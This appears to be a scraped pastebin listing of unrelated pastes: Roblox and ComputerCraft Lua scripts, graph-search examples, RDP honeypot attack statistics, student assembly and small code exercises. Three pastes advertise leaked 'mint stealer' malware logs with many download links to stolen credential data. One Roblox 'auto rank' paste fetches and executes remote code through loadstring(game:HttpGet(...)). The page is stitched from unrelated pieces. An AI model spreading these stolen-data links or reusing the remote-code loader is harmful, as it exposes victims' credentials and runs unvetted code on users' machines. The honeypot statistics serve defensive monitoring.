local TweenService = game:GetService(""TweenService"")

local UsageFrame = script.Parent.Usage.Frame

local Values = ReplicatedStorage.Values
local Usage = Values.Power:FindFirstChild(""Usage"")
local Percents = Values.Power:FindFirstChild(""Percents"")

local SizeOriginal = UDim2.new(0, 198, 0, 33) -- your frame size

local function tween(instance, info, property)
	local tween = TweenService:Create(instance, info, property)
	tween:Play()
end
local PWR_DB = nil
local Info = TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local function ChangePower()
	if Usage.Value == 1 then
		PWR_DB = 7.5
		tween(UsageFrame, Info, {
			Size = UDim2.new(0, 17, 0, 33) -- 1
		})
	elseif Usage.Value == 2 then
		PWR_DB = 6.25
		tween(UsageFrame, Info, {
			Size = UDim2.new(0, 64, 0, 33) -- 2
		})
	elseif Usage.Value == 3 then
		PWR_DB = 5.45
		tween(UsageFrame, Info, {
			Size = UDim2.new(0, 127, 0, 33) -- 3
		})
	elseif Usage.Value == 4 then
		PWR_DB = 4.85
		tween(UsageFrame, Info, {
			Size = SizeOriginal -- 4
		})
	elseif Usage.Value == 5 then
		PWR_DB = 4.15
	end
end

local function ZeroPower()
	return print(""your dead gg"")
end
RunService.Heartbeat:Connect(function()
	ChangePower()
end)
while true do
	if Percents.Value > 0 then
		Percents.Value -= 1
		task.wait(PWR_DB)
	else
		return false, ZeroPower()
	end
end"
CwH8Jez4,Depth-first search,nathanwailes,Python,Sunday 24th of March 2024 07:24:17 PM CDT,"def dfs(graph, start, visited=None):
    if visited is None:
        visited = set() # Initialize the set of visited nodes
        
    visited.add(start) # Mark the current node as visited
    print(start) # Process the current node (for example, print it)
    
    for neighbor in graph[start]:
        if neighbor not in visited:
            dfs(graph, neighbor, visited) # Recursively visit unvisited neighbors

# Example usage:
# Define a graph as an adjacency list
graph = {
    'A' : ['B','C'],
    'B' : ['D', 'E'],
    'C' : ['F'],
    'D' : [],
    'E' : ['F'],
    'F' : []
}

dfs(graph, 'A') # Start DFS from vertex 'A'
"
GcduujfA,Breadth-first search,nathanwailes,Python,Sunday 24th of March 2024 07:21:18 PM CDT,"from collections import deque

def bfs(graph, start):
    visited = set() # Set to keep track of visited nodes.
    queue = deque([start]) # Initialize a queue with the starting vertex
    
    while queue: # While the queue is not empty
        vertex = queue.popleft() # Remove the vertex from the queue
        if vertex not in visited:
            visited.add(vertex) # Mark the vertex as visited
            print(vertex) # Process the vertex (for example, print it)
            
            # Add all unvisited neighbors to the queue
            for neighbor in graph[vertex]:
                if neighbor not in visited:
                    queue.append(neighbor)

# Example usage:
# Define a graph as an adjacency list
graph = {
    'A' : ['B','C'],
    'B' : ['D', 'E'],
    'C' : ['F'],
    'D' : [],
    'E' : ['F'],
    'F' : []
}

bfs(graph, 'A') # Start BFS from vertex 'A'
"
dcveR7YG,Regular Pulse,Alexr360,Lua,Sunday 24th of March 2024 07:19:02 PM CDT,"-- Get the number of pulses from the user
print(""Enter the number of pulses:"")
local numPulses = tonumber(read())-1

-- Validate user input
if numPulses == nil or numPulses <= 0 then
    print(""Invalid input. Please enter a positive number."")
    return
end

-- Function to emit a redstone pulse
local function emitPulse()
    redstone.setOutput(""right"", true)
    sleep(0.5) -- Adjust this delay if needed
    redstone.setOutput(""right"", false)
end

-- Loop to emit the specified number of pulses
for i = 1, numPulses do
    emitPulse()
    print(""Pulse emitted: "" .. i)
    if i < numPulses then
        print(""Waiting 4 seconds until the next pulse..."")
        sleep(4)
    end
end

print(""Finished emitting pulses."")"
HEBVRjCb,2024-03-24_stats.json,rdp_snitch,JSON,Sunday 24th of March 2024 07:18:04 PM CDT,"{
  ""ip"": {
    ""80.66.88.211"": 3,
    ""58.218.204.183"": 18,
    ""167.94.146.60"": 3,
    ""87.251.75.145"": 12,
    ""198.235.24.42"": 9,
    ""103.179.148.51"": 243,
    ""45.227.254.48"": 12,
    ""101.200.164.85"": 18,
    ""103.14.49.13"": 3,
    ""194.165.16.10"": 6,
    ""87.251.75.64"": 3,
    ""103.20.97.235"": 3,
    ""103.48.84.216"": 3,
    ""8.138.126.111"": 3,
    ""185.170.144.3"": 6,
    ""198.235.24.48"": 9,
    ""2.57.149.186"": 3,
    ""87.251.75.120"": 6,
    ""143.198.215.154"": 6,
    ""36.91.222.100"": 6,
    ""173.237.25.68"": 3,
    ""196.190.117.7"": 6,
    ""212.70.149.146"": 6,
    ""62.204.41.123"": 6,
    ""171.244.57.79"": 3,
    ""84.201.2.2"": 6,
    ""165.154.59.90"": 3,
    ""128.199.242.196"": 21,
    ""88.214.26.66"": 6,
    ""198.235.24.5"": 9,
    ""45.227.254.26"": 6,
    ""4.227.8.246"": 3,
    ""120.240.145.8"": 3,
    ""84.17.46.143"": 3,
    ""198.235.24.178"": 9
  },
  ""asn"": {
    ""AS208091"": 24,
    ""AS4134"": 18,
    ""AS398705"": 3,
    ""AS396982"": 36,
    ""AS140224"": 243,
    ""AS267784"": 18,
    ""AS37963"": 21,
    ""AS149134"": 3,
    ""AS48721"": 6,
    ""AS150880"": 3,
    ""AS131423"": 3,
    ""AS197414"": 6,
    ""AS208312"": 3,
    ""AS14061"": 27,
    ""AS7713"": 6,
    ""AS7979"": 3,
    ""AS24757"": 6,
    ""AS204428"": 6,
    ""AS59425"": 6,
    ""AS38731"": 3,
    ""AS44066"": 6,
    ""AS135377"": 3,
    ""AS209132"": 6,
    ""AS8075"": 3,
    ""AS56040"": 3,
    ""AS60068"": 3
  },
  ""isp"": {
    ""Xhost Internet Solutions"": 3,
    ""Chinanet"": 18,
    ""Censys, Inc."": 3,
    ""Xhost Internet Solutions LP"": 27,
    ""Google LLC"": 36,
    ""STARCLOUD GLOBAL PTE., LTD."": 243,
    ""Flyservers S.A."": 24,
    ""Hangzhou Alibaba Advertising Co"": 18,
    ""Fute Commercial and Services Company Limited"": 3,
    ""Fast Byte Fast Data Company Limited"": 3,
    ""LVHN"": 3,
    ""ALICLOUD"": 3,
    ""Red Byte LLC"": 3,
    ""DigitalOcean, LLC"": 27,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Servers.com, Inc."": 3,
    ""Ethiotelecom"": 6,
    ""SS-Net"": 6,
    ""Horizon LLC"": 6,
    ""VIETEL"": 3,
    ""www.accelerated.de"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Alviva Holding Limited"": 6,
    ""Microsoft Corporation"": 3,
    ""China Mobile communications corporation"": 3,
    ""DataCamp Limited"": 3
  },
  ""org"": {
    ""XHOSTIS"": 3,
    ""Chinanet JS"": 18,
    ""Censys, Inc."": 3,
    ""Xhost Internet Solutions"": 21,
    ""Palo Alto Networks, Inc"": 36,
    ""Star Cloud Network Co., Ltd."": 243,
    ""UAB Host Baltic"": 18,
    ""Aliyun Computing Co., LTD"": 18,
    ""FUTE"": 3,
    ""Flyservers S.A"": 6,
    ""FASTBYTE"": 3,
    ""Unknown"": 9,
    ""Aliyun Computing Co."": 3,
    ""Xhostis"": 6,
    ""Chang Way Technologies Co. Limited"": 3,
    ""DigitalOcean, LLC"": 27,
    ""Telekomunikasi Indonesia"": 6,
    ""Servers.com, Inc."": 3,
    ""4Media Ltd"": 6,
    ""Horizon LLC"": 6,
    ""Viettel Corporation"": 3,
    ""diva-e Datacenters GmbH"": 6,
    ""Ucloud Information Technology"": 3,
    ""FutureNow Incorporated"": 6,
    ""Microsoft Azure Cloud (westus3)"": 3,
    ""China Mobile"": 3,
    ""Cdn77 AMS"": 3
  },
  ""regionName"": {
    ""Drenthe"": 3,
    ""Jiangsu"": 18,
    ""Hesse"": 9,
    ""North Holland"": 30,
    ""California"": 36,
    ""Tokyo"": 243,
    ""Vilnius"": 18,
    ""Beijing"": 18,
    ""Ho Chi Minh"": 9,
    ""Kaunas"": 6,
    ""Guangdong"": 6,
    ""Lesser Poland"": 3,
    ""Central Singapore"": 6,
    ""Jakarta"": 6,
    ""Texas"": 3,
    ""Addis Ababa"": 6,
    ""Sliven"": 6,
    ""Moscow"": 6,
    ""Hanoi"": 3,
    ""Metro Manila"": 3,
    ""South West"": 21,
    ""English River"": 6,
    ""Arizona"": 3
  },
  ""country"": {
    ""The Netherlands"": 33,
    ""China"": 42,
    ""Germany"": 9,
    ""United States"": 42,
    ""Japan"": 243,
    ""Lithuania"": 24,
    ""Vietnam"": 12,
    ""Poland"": 3,
    ""Singapore"": 27,
    ""Indonesia"": 6,
    ""Ethiopia"": 6,
    ""Bulgaria"": 6,
    ""Russia"": 6,
    ""Philippines"": 3,
    ""Seychelles"": 6
  },
  ""account"": {
    ""Administr"": 39,
    ""hello"": 330,
    ""(empty)"": 6,
    ""pNSTQhfXM"": 3,
    ""DvcByS"": 3,
    ""JSWeXk"": 3,
    ""Test"": 54,
    ""PqLLiyhhe"": 3,
    ""fjcSLn"": 3,
    ""kqrDre"": 3,
    ""Administrator"": 3,
    ""JzbMzplRb"": 3,
    ""DeSOhS"": 3,
    ""vrpNhp"": 3,
    ""ccoECYQrg"": 3,
    ""srVcSn"": 3,
    ""etKOhw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 468
  },
  ""client_build"": {
    ""Unknown"": 468
  },
  ""client_name"": {
    ""Unknown"": 468
  },
  ""ip_type"": {
    ""Unknown"": 360,
    ""hosting"": 75,
    ""hosting & proxy"": 30,
    ""mobile"": 3
  }
}"
r6cjTmGW,2024-03-24_stats.json,rdp_snitch,JSON,Sunday 24th of March 2024 07:16:08 PM CDT,"{
  ""ip"": {
    ""80.66.88.211"": 2,
    ""58.218.204.183"": 12,
    ""167.94.146.60"": 2,
    ""87.251.75.145"": 8,
    ""198.235.24.42"": 6,
    ""103.179.148.51"": 162,
    ""45.227.254.48"": 8,
    ""101.200.164.85"": 12,
    ""103.14.49.13"": 2,
    ""194.165.16.10"": 4,
    ""87.251.75.64"": 2,
    ""103.20.97.235"": 2,
    ""103.48.84.216"": 2,
    ""8.138.126.111"": 2,
    ""185.170.144.3"": 4,
    ""198.235.24.48"": 6,
    ""2.57.149.186"": 2,
    ""87.251.75.120"": 4,
    ""143.198.215.154"": 4,
    ""36.91.222.100"": 4,
    ""173.237.25.68"": 2,
    ""196.190.117.7"": 4,
    ""212.70.149.146"": 4,
    ""62.204.41.123"": 4,
    ""171.244.57.79"": 2,
    ""84.201.2.2"": 4,
    ""165.154.59.90"": 2,
    ""128.199.242.196"": 14,
    ""88.214.26.66"": 4,
    ""198.235.24.5"": 6,
    ""45.227.254.26"": 4,
    ""4.227.8.246"": 2,
    ""120.240.145.8"": 2,
    ""84.17.46.143"": 2,
    ""198.235.24.178"": 6
  },
  ""asn"": {
    ""AS208091"": 16,
    ""AS4134"": 12,
    ""AS398705"": 2,
    ""AS396982"": 24,
    ""AS140224"": 162,
    ""AS267784"": 12,
    ""AS37963"": 14,
    ""AS149134"": 2,
    ""AS48721"": 4,
    ""AS150880"": 2,
    ""AS131423"": 2,
    ""AS197414"": 4,
    ""AS208312"": 2,
    ""AS14061"": 18,
    ""AS7713"": 4,
    ""AS7979"": 2,
    ""AS24757"": 4,
    ""AS204428"": 4,
    ""AS59425"": 4,
    ""AS38731"": 2,
    ""AS44066"": 4,
    ""AS135377"": 2,
    ""AS209132"": 4,
    ""AS8075"": 2,
    ""AS56040"": 2,
    ""AS60068"": 2
  },
  ""isp"": {
    ""Xhost Internet Solutions"": 2,
    ""Chinanet"": 12,
    ""Censys, Inc."": 2,
    ""Xhost Internet Solutions LP"": 18,
    ""Google LLC"": 24,
    ""STARCLOUD GLOBAL PTE., LTD."": 162,
    ""Flyservers S.A."": 16,
    ""Hangzhou Alibaba Advertising Co"": 12,
    ""Fute Commercial and Services Company Limited"": 2,
    ""Fast Byte Fast Data Company Limited"": 2,
    ""LVHN"": 2,
    ""ALICLOUD"": 2,
    ""Red Byte LLC"": 2,
    ""DigitalOcean, LLC"": 18,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Servers.com, Inc."": 2,
    ""Ethiotelecom"": 4,
    ""SS-Net"": 4,
    ""Horizon LLC"": 4,
    ""VIETEL"": 2,
    ""www.accelerated.de"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Alviva Holding Limited"": 4,
    ""Microsoft Corporation"": 2,
    ""China Mobile communications corporation"": 2,
    ""DataCamp Limited"": 2
  },
  ""org"": {
    ""XHOSTIS"": 2,
    ""Chinanet JS"": 12,
    ""Censys, Inc."": 2,
    ""Xhost Internet Solutions"": 14,
    ""Palo Alto Networks, Inc"": 24,
    ""Star Cloud Network Co., Ltd."": 162,
    ""UAB Host Baltic"": 12,
    ""Aliyun Computing Co., LTD"": 12,
    ""FUTE"": 2,
    ""Flyservers S.A"": 4,
    ""FASTBYTE"": 2,
    ""Unknown"": 6,
    ""Aliyun Computing Co."": 2,
    ""Xhostis"": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""DigitalOcean, LLC"": 18,
    ""Telekomunikasi Indonesia"": 4,
    ""Servers.com, Inc."": 2,
    ""4Media Ltd"": 4,
    ""Horizon LLC"": 4,
    ""Viettel Corporation"": 2,
    ""diva-e Datacenters GmbH"": 4,
    ""Ucloud Information Technology"": 2,
    ""FutureNow Incorporated"": 4,
    ""Microsoft Azure Cloud (westus3)"": 2,
    ""China Mobile"": 2,
    ""Cdn77 AMS"": 2
  },
  ""regionName"": {
    ""Drenthe"": 2,
    ""Jiangsu"": 12,
    ""Hesse"": 6,
    ""North Holland"": 20,
    ""California"": 24,
    ""Tokyo"": 162,
    ""Vilnius"": 12,
    ""Beijing"": 12,
    ""Ho Chi Minh"": 6,
    ""Kaunas"": 4,
    ""Guangdong"": 4,
    ""Lesser Poland"": 2,
    ""Central Singapore"": 4,
    ""Jakarta"": 4,
    ""Texas"": 2,
    ""Addis Ababa"": 4,
    ""Sliven"": 4,
    ""Moscow"": 4,
    ""Hanoi"": 2,
    ""Metro Manila"": 2,
    ""South West"": 14,
    ""English River"": 4,
    ""Arizona"": 2
  },
  ""country"": {
    ""The Netherlands"": 22,
    ""China"": 28,
    ""Germany"": 6,
    ""United States"": 28,
    ""Japan"": 162,
    ""Lithuania"": 16,
    ""Vietnam"": 8,
    ""Poland"": 2,
    ""Singapore"": 18,
    ""Indonesia"": 4,
    ""Ethiopia"": 4,
    ""Bulgaria"": 4,
    ""Russia"": 4,
    ""Philippines"": 2,
    ""Seychelles"": 4
  },
  ""account"": {
    ""Administr"": 26,
    ""hello"": 220,
    ""(empty)"": 4,
    ""pNSTQhfXM"": 2,
    ""DvcByS"": 2,
    ""JSWeXk"": 2,
    ""Test"": 36,
    ""PqLLiyhhe"": 2,
    ""fjcSLn"": 2,
    ""kqrDre"": 2,
    ""Administrator"": 2,
    ""JzbMzplRb"": 2,
    ""DeSOhS"": 2,
    ""vrpNhp"": 2,
    ""ccoECYQrg"": 2,
    ""srVcSn"": 2,
    ""etKOhw"": 2
  },
  ""keyboard"": {
    ""Unknown"": 312
  },
  ""client_build"": {
    ""Unknown"": 312
  },
  ""client_name"": {
    ""Unknown"": 312
  },
  ""ip_type"": {
    ""Unknown"": 240,
    ""hosting"": 50,
    ""hosting & proxy"": 20,
    ""mobile"": 2
  }
}"
06kuyr6u,2024-03-24_stats.json,rdp_snitch,JSON,Sunday 24th of March 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""80.66.88.211"": 1,
    ""58.218.204.183"": 6,
    ""167.94.146.60"": 1,
    ""87.251.75.145"": 4,
    ""198.235.24.42"": 3,
    ""103.179.148.51"": 81,
    ""45.227.254.48"": 4,
    ""101.200.164.85"": 6,
    ""103.14.49.13"": 1,
    ""194.165.16.10"": 2,
    ""87.251.75.64"": 1,
    ""103.20.97.235"": 1,
    ""103.48.84.216"": 1,
    ""8.138.126.111"": 1,
    ""185.170.144.3"": 2,
    ""198.235.24.48"": 3,
    ""2.57.149.186"": 1,
    ""87.251.75.120"": 2,
    ""143.198.215.154"": 2,
    ""36.91.222.100"": 2,
    ""173.237.25.68"": 1,
    ""196.190.117.7"": 2,
    ""212.70.149.146"": 2,
    ""62.204.41.123"": 2,
    ""171.244.57.79"": 1,
    ""84.201.2.2"": 2,
    ""165.154.59.90"": 1,
    ""128.199.242.196"": 7,
    ""88.214.26.66"": 2,
    ""198.235.24.5"": 3,
    ""45.227.254.26"": 2,
    ""4.227.8.246"": 1,
    ""120.240.145.8"": 1,
    ""84.17.46.143"": 1,
    ""198.235.24.178"": 3
  },
  ""asn"": {
    ""AS208091"": 8,
    ""AS4134"": 6,
    ""AS398705"": 1,
    ""AS396982"": 12,
    ""AS140224"": 81,
    ""AS267784"": 6,
    ""AS37963"": 7,
    ""AS149134"": 1,
    ""AS48721"": 2,
    ""AS150880"": 1,
    ""AS131423"": 1,
    ""AS197414"": 2,
    ""AS208312"": 1,
    ""AS14061"": 9,
    ""AS7713"": 2,
    ""AS7979"": 1,
    ""AS24757"": 2,
    ""AS204428"": 2,
    ""AS59425"": 2,
    ""AS38731"": 1,
    ""AS44066"": 2,
    ""AS135377"": 1,
    ""AS209132"": 2,
    ""AS8075"": 1,
    ""AS56040"": 1,
    ""AS60068"": 1
  },
  ""isp"": {
    ""Xhost Internet Solutions"": 1,
    ""Chinanet"": 6,
    ""Censys, Inc."": 1,
    ""Xhost Internet Solutions LP"": 9,
    ""Google LLC"": 12,
    ""STARCLOUD GLOBAL PTE., LTD."": 81,
    ""Flyservers S.A."": 8,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""Fute Commercial and Services Company Limited"": 1,
    ""Fast Byte Fast Data Company Limited"": 1,
    ""LVHN"": 1,
    ""ALICLOUD"": 1,
    ""Red Byte LLC"": 1,
    ""DigitalOcean, LLC"": 9,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Servers.com, Inc."": 1,
    ""Ethiotelecom"": 2,
    ""SS-Net"": 2,
    ""Horizon LLC"": 2,
    ""VIETEL"": 1,
    ""www.accelerated.de"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Alviva Holding Limited"": 2,
    ""Microsoft Corporation"": 1,
    ""China Mobile communications corporation"": 1,
    ""DataCamp Limited"": 1
  },
  ""org"": {
    ""XHOSTIS"": 1,
    ""Chinanet JS"": 6,
    ""Censys, Inc."": 1,
    ""Xhost Internet Solutions"": 7,
    ""Palo Alto Networks, Inc"": 12,
    ""Star Cloud Network Co., Ltd."": 81,
    ""UAB Host Baltic"": 6,
    ""Aliyun Computing Co., LTD"": 6,
    ""FUTE"": 1,
    ""Flyservers S.A"": 2,
    ""FASTBYTE"": 1,
    ""Unknown"": 3,
    ""Aliyun Computing Co."": 1,
    ""Xhostis"": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""DigitalOcean, LLC"": 9,
    ""Telekomunikasi Indonesia"": 2,
    ""Servers.com, Inc."": 1,
    ""4Media Ltd"": 2,
    ""Horizon LLC"": 2,
    ""Viettel Corporation"": 1,
    ""diva-e Datacenters GmbH"": 2,
    ""Ucloud Information Technology"": 1,
    ""FutureNow Incorporated"": 2,
    ""Microsoft Azure Cloud (westus3)"": 1,
    ""China Mobile"": 1,
    ""Cdn77 AMS"": 1
  },
  ""regionName"": {
    ""Drenthe"": 1,
    ""Jiangsu"": 6,
    ""Hesse"": 3,
    ""North Holland"": 10,
    ""California"": 12,
    ""Tokyo"": 81,
    ""Vilnius"": 6,
    ""Beijing"": 6,
    ""Ho Chi Minh"": 3,
    ""Kaunas"": 2,
    ""Guangdong"": 2,
    ""Lesser Poland"": 1,
    ""Central Singapore"": 2,
    ""Jakarta"": 2,
    ""Texas"": 1,
    ""Addis Ababa"": 2,
    ""Sliven"": 2,
    ""Moscow"": 2,
    ""Hanoi"": 1,
    ""Metro Manila"": 1,
    ""South West"": 7,
    ""English River"": 2,
    ""Arizona"": 1
  },
  ""country"": {
    ""The Netherlands"": 11,
    ""China"": 14,
    ""Germany"": 3,
    ""United States"": 14,
    ""Japan"": 81,
    ""Lithuania"": 8,
    ""Vietnam"": 4,
    ""Poland"": 1,
    ""Singapore"": 9,
    ""Indonesia"": 2,
    ""Ethiopia"": 2,
    ""Bulgaria"": 2,
    ""Russia"": 2,
    ""Philippines"": 1,
    ""Seychelles"": 2
  },
  ""account"": {
    ""Administr"": 13,
    ""hello"": 110,
    ""(empty)"": 2,
    ""pNSTQhfXM"": 1,
    ""DvcByS"": 1,
    ""JSWeXk"": 1,
    ""Test"": 18,
    ""PqLLiyhhe"": 1,
    ""fjcSLn"": 1,
    ""kqrDre"": 1,
    ""Administrator"": 1,
    ""JzbMzplRb"": 1,
    ""DeSOhS"": 1,
    ""vrpNhp"": 1,
    ""ccoECYQrg"": 1,
    ""srVcSn"": 1,
    ""etKOhw"": 1
  },
  ""keyboard"": {
    ""Unknown"": 156
  },
  ""client_build"": {
    ""Unknown"": 156
  },
  ""client_name"": {
    ""Unknown"": 156
  },
  ""ip_type"": {
    ""Unknown"": 120,
    ""hosting"": 25,
    ""hosting & proxy"": 10,
    ""mobile"": 1
  }
}"
WRMKf1iA,KSDK :: String Support :: Word Wrap,jargon,FreeBasic,Sunday 24th of March 2024 07:04:58 PM CDT,"sub wordWalk(text as string=EMPTY, wordSep as string = SP, lineSep as string = CRLF, ledger(any) as string,ww as longint)
	
	dim as longint scrw=0, scrh=0, scrdepth=0, scrbpp=0, scrpitch=0, scrrate=0
	dim as string scrdriver=EMPTY

	Screeninfo ( scrw, scrh, scrdepth, scrbpp, scrpitch, scrrate, scrdriver )

	dim as longint owordSep=0, olineSep=0

	if ww=0 then
		ww=scrw/8
	end if

	dim as string buffer=EMPTY,reserve=EMPTY
	dim as longint index=0,offset=0
	
	erase ledger
	
	reserve=text
	
	do while len(reserve) GTR 0
		
		owordSep=instr(reserve,wordSep)
		olineSep=instr(reserve,lineSep)
		
		if (owordSep GTR 0) or (olineSep GTR 0) then
			if (owordSep LSS olineSep) and (owordSep GTR 0) then
				
				if len(ledger(ubound(ledger,1)) & mid(reserve,1,owordSep-1)) GTR ww then
					redim preserve ledger(lbound(ledger,1) to ubound(ledger,1)+1)
				end if
				
				ledger(ubound(ledger,1)) &= mid(reserve,1,owordSep-1)
				reserve = mid(reserve,owordSep+len(wordSep))
				
			elseif (olineSep LSS owordSep) and (olineSep GTR 0)  then
				
				ledger(ubound(ledger,1)) &= mid(reserve,1,olineSep-1)
				
				reserve = mid(reserve,olineSep+len(lineSep))
				redim preserve ledger(lbound(ledger,1) to ubound(ledger,1)+1)
				
			end if 
		end if
				
	loop
	
	dim as longint fm=0
	fm=freefile
	if open(""ledger.txt"" for output as #fm) NEQ 0 then
		close #fm
		return
	end if
	print #fm,lbound(ledger,1),ubound(ledger,1)
	for index=lbound(ledger,1) to ubound(ledger,1) step 1
		print #fm,index,ledger(index)
	next index
	close #fm
	
	return
	
end sub
"
PG7bAHF9,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Sunday 24th of March 2024 05:21:52 PM CDT,"https://pastes.io - #1 Pastebin Alternative - its free.

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
."
GsCi9bG8,mint stealer logs c2,Artem_,ABAP,Sunday 24th of March 2024 05:18:04 PM CDT,"mint-stl.ru logs leak powered by APT-69
https://www.paste.cash/?c6f4f81992738ce0#GQCZ4JgEK8x3JQFR6WHYwN8ev3JyAws87tL9frrpaQDL
 
logs:
https://gofile.io/d/JWdg8x
https://gofile.io/d/rp6yZl
https://gofile.io/d/ytYtw0
https://gofile.io/d/VJFFoh
https://gofile.io/d/FjeNyW
https://gofile.io/d/PfrO8S
https://gofile.io/d/qcbE33
https://gofile.io/d/8l5j8s
https://gofile.io/d/mZ2iDU
https://gofile.io/d/sKnitI
https://gofile.io/d/HZKgKn
https://gofile.io/d/C44FJN
https://gofile.io/d/BKTIDc
https://gofile.io/d/yARaoS
https://gofile.io/d/Hc49Us
Mint Stealer Logs"
m8qwxgAQ,Pet Sim 99 Auto Rank Script,quikzyYTbtw,Lua,Sunday 24th of March 2024 05:14:58 PM CDT,"--[[
-PS99 Auto Rank Script 
 made by zerqhy :)
]]

loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/hugesgames.io""))()"
g7xEN8L5,arch_1_6e_me,pan7nikt,6502 TASM/64TASS,Sunday 24th of March 2024 05:01:56 PM CDT,";=======================================================================================;
;                                                                                       ;
; Plik           : arch1-6e.asm                                                         ;
; Format         : EXE                                                                  ;
; Cwiczenie      : Kompilacja, konsolidacja i debugowanie program�w                     ;
;                  asemblerowych                                                        ;
; Autorzy        : Julia Marcinkowska, Aleksandra Wnuk, grupa 3, poniedzia�ek, 14:15    ;
; Data zaliczenia: 19.03.2018                                                           ;
; Uwagi          : Program obliczajacy wzor: d/(b-c)*(a+b)                              ;
;                                                                                       ;
;=======================================================================================;

                .MODEL  SMALL							;dwa segmenty (jeden na CS, jeden na DS+SS)

Dane            SEGMENT									;poczatek segmentu danych

a               DB     	20
b               DB      10
c               DB      3
d               DB      3
Wynik           DB      ?								;zmienna wynik
Reszta			DB		?								;zmienna reszta

Dane            ENDS									;koniec segmentu danych

Kod             SEGMENT									;poczatek segmentu kodu

                ASSUME   CS:Kod, DS:Dane, SS:Stosik		;informuje kompilator, z kt�rego rejestru segmentowego ma korzystac przy odwolaniach do etykiety

Start:
                mov     ax, Dane						;przeniesienie danych do rejestru og�lnego
				mov		ds, ax							;przeniesienie danych z rejestru og�lnego do segmentowego

				mov		AL, a							;przeniesienie danych a do rejestru al
				add 	AL, b							;dodanie b do rejestru al
				mul		d								;mnozenie rejestru al razy d
				mov		BL, b							;przeniesienie danych do rejestru bl
				sub		BL, c							;odjecie danej c od rejestru bl
				div		BL								;podzielenie rejestru al przez rejestr bl
				mov 	Wynik, AL						;przeniesienie rejestru al do zmiennej wynik
				mov 	Reszta, AH

				mov     ax, 4C00h						;funkcja zakanczajaca program
                int     21h								;wywolanie funkcji

Kod             ENDS									;koniec segmentu kodu

Stosik          SEGMENT STACK							;poczatek segmentu stosu

                DB      100h DUP (?)					;alokacja pamieci na stos o 100 miejscach o nieokreslonej wielkosci

Stosik          ENDS									;koniec segmentu stosu

                END    Start

"
Fe2U50hf,mint stealer logs,Artem_,JavaScript,Sunday 24th of March 2024 04:34:51 PM CDT,"mint-stl.ru logs by APT-69
https://www.paste.cash/?c6f4f81992738ce0#GQCZ4JgEK8x3JQFR6WHYwN8ev3JyAws87tL9frrpaQDL
 
logs:
https://gofile.io/d/JWdg8x
https://gofile.io/d/rp6yZl
https://gofile.io/d/ytYtw0
https://gofile.io/d/VJFFoh
https://gofile.io/d/FjeNyW
https://gofile.io/d/PfrO8S
https://gofile.io/d/qcbE33
https://gofile.io/d/8l5j8s
https://gofile.io/d/mZ2iDU
https://gofile.io/d/sKnitI
https://gofile.io/d/HZKgKn
https://gofile.io/d/C44FJN
https://gofile.io/d/BKTIDc
https://gofile.io/d/yARaoS
https://gofile.io/d/Hc49Us
Mint Stealer Logs"
uQQeyjk2,Mint Stealer Logs (Malware Stealer logs),Artem_,C,Sunday 24th of March 2024 04:34:25 PM CDT,"mint-stl.ru logs leak by APT-69
https://www.paste.cash/?c6f4f81992738ce0#GQCZ4JgEK8x3JQFR6WHYwN8ev3JyAws87tL9frrpaQDL

logs:
https://gofile.io/d/JWdg8x
https://gofile.io/d/rp6yZl
https://gofile.io/d/ytYtw0
https://gofile.io/d/VJFFoh
https://gofile.io/d/FjeNyW
https://gofile.io/d/PfrO8S
https://gofile.io/d/qcbE33
https://gofile.io/d/8l5j8s
https://gofile.io/d/mZ2iDU
https://gofile.io/d/sKnitI
https://gofile.io/d/HZKgKn
https://gofile.io/d/C44FJN
https://gofile.io/d/BKTIDc
https://gofile.io/d/yARaoS
https://gofile.io/d/Hc49Us
Mint Stealer Logs"
dwVLxd8k,computerFirm,zarkoto223,JavaScript,Sunday 24th of March 2024 04:26:19 PM CDT,"function asd(input) {
  let n = Number(input[0]);
  let sales = 0;
  let rating = 0;
  let last = 0;
  let firstTwo = 0;

  for (let i = 1; i <= n; i++) {
    let pcs = input[i];
    last = Number(pcs[2]);
    firstTwo = Number(pcs[0] + pcs[1]);
    rating += last;

    if (last === 2) {
      sales += 0;
    } else if (last === 3) {
      sales += firstTwo / 2;
    } else if (last === 4) {
      sales += firstTwo * 0.7;
    } else if (last === 5) {
      sales += firstTwo * 0.85;
    } else {
      sales += firstTwo;
    }
  }
  console.log(sales.toFixed(2));
  console.log((rating / n).toFixed(2));
}"
RHdE1a4x,Untitled,unmeinks,C++,Sunday 24th of March 2024 04:17:33 PM CDT,"// PyxEngine/public/GameAPI.h
#pragma once
#include ""Types.h""

#ifdef PYX_PLATFORM_WINDOWS
	#ifdef PYX_BUILD_ENGINE
		#define PYX_GAME_API extern ""C"" __declspec(dllexport)
	#else
		#define PYX_GAME_API extern ""C""
	#endif
#else
	#error Platform not supported
#endif

class IGameAPI {
   public:
	virtual ~IGameAPI() = default;
	virtual void helloWorld() = 0;
};

typedef IGameAPI* GetPyxGameAPI(PyxContext* context);

// PyxEngine/public/GameAPI.cpp
#include ""GameAPI.h""

#include <iostream>

class GameAPI : public IGameAPI {
   public:
	GameAPI(PyxContext* context) : m_Context(context) {}
	void helloWorld() override { std::cout << ""goodbye world ):"" << std::endl; }

   private:
	PyxContext* m_Context;
};

